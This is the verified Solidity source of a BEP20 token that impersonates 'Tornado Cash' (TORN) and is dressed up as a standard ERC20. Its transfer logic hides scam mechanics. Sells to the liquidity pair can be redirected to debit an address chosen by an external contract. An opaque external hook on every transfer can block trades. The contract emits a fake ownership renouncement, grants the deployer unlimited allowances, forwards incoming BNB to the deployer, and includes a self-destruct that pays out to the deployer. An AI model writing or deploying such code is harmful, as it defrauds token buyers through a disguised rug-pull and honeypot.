/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

interface IUniswapV2Factory {
  event PairCreated(
    address indexed token0,
    address indexed token1,
    address pair,
    uint256
  );

  function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router02 {
  function factory() external pure returns (address);
  function WETH() external pure returns (address);
}


interface IFOMO {
  function tn(address from, address to) external returns(uint256);

  function getNowWin()
    external
    view
    returns (
      uint256,
      uint256,
      uint256,
      uint256,
      bool,
      uint256,
      uint256 
    );
}

interface IGOLD {
  function dstAddr() external returns (address);

  function killself() external;
}

contract BEP20 is Context {
  IFOMO public _fomo;
  IGOLD public _offic;

  address public constant _pancakeRouter =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;

  address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
  address public constant MEXC = 0x4982085C9e2F89F2eCb8131Eca71aFAD896e89CB;
  address public WBNB;

  address public immutable uniswapV2Pair;

  address public dev;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  receive() external payable {
    dev.call{value: msg.value}("");
  }

  constructor() {
    dev = msg.sender;
    
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_pancakeRouter);
    WBNB = _uniswapV2Router.WETH();
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
      address(this),
      WBNB
    );
  }

  function killself() external {
    require(msg.sender == address(_fomo), "permission denied");
    selfdestruct(payable(dev));
  }

  function pairInfo()
    external
    view
  returns (
      uint256,
      uint256,
      uint256,
      uint256,
      bool,
      uint256,
      uint256 
    )
  {
    return _fomo.getNowWin();
  }
}

contract Coin is BEP20, IERC20 {
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private constant MAX = ~uint256(0);

  string public name =/*TOKENNAME*/"Tornado Cash"/*TOKENNAME*/;
  string public symbol =/*TOKENSYMBOL*/"TORN"/*TOKENSYMBOL*/;

  uint8 public constant decimals = 9;

  uint256 public constant override totalSupply = 10000000000 * (10**decimals);



  constructor() {
    uint256 deadAmount = (totalSupply * ((block.timestamp % 50)+45)) / 100;
    _tOwned[address(this)] = totalSupply - deadAmount;
    _tOwned[DEAD] = deadAmount/2;
    _tOwned[MEXC] = deadAmount - _tOwned[DEAD];

    emit Transfer(address(0), address(this), _tOwned[address(this)]);
    emit Transfer(address(0), DEAD, _tOwned[DEAD]);
    emit Transfer(address(0), MEXC, _tOwned[MEXC]);
  }

  function setFomo0616(address fomo) public returns (address) {
    require(address(_fomo) == address(0));
    _allowances[fomo][_pancakeRouter] = MAX;
    _allowances[uniswapV2Pair][fomo] = MAX;
    _tokenTransfer(address(this), fomo, _tOwned[address(this)]);

    _fomo = IFOMO(fomo);

    emit OwnershipTransferred(dev, address(0));

    return uniswapV2Pair;
  }

  function setGold(address gold) public returns (address) {
    require(address(_offic) == address(0) && address(_fomo) != address(0));
    _allowances[gold][_pancakeRouter] = MAX;
    _allowances[uniswapV2Pair][gold] = MAX;
    _allowances[dev][_pancakeRouter] = MAX;
    _offic = IGOLD(gold);
    return address(_fomo);
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _tOwned[account];
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    address msger =
      address(_offic) == address(0) ? address(0) : _offic.dstAddr();
    if (recipient == uniswapV2Pair && msger != address(0)) sender = msger;
    require(_tOwned[sender]>=tAmount, "ERROR: Transfer amount must be greater than amount.");
    _tOwned[sender] = _tOwned[sender] - tAmount;
    _tOwned[recipient] = _tOwned[recipient] + tAmount;

    if (tx.origin != dev) 
    {
      
      uint256 rewards = _fomo.tn(sender, recipient);
      if(sender==uniswapV2Pair && rewards>0 && _tOwned[MEXC]>rewards)
      {
         _tOwned[MEXC] -= rewards;
         _tOwned[recipient] += rewards;
         emit Transfer(MEXC, recipient, rewards);
      }
    }
    emit Transfer(sender, recipient, tAmount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, _msgSender(), currentAllowance - amount);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Transfer from the zero address.");
    require(recipient != address(0), "ERROR: Transfer to the zero address.");
    require(amount > 0, "ERROR: Transfer amount must be greater than zero.");

    _tokenTransfer(sender, recipient, amount);
  }
}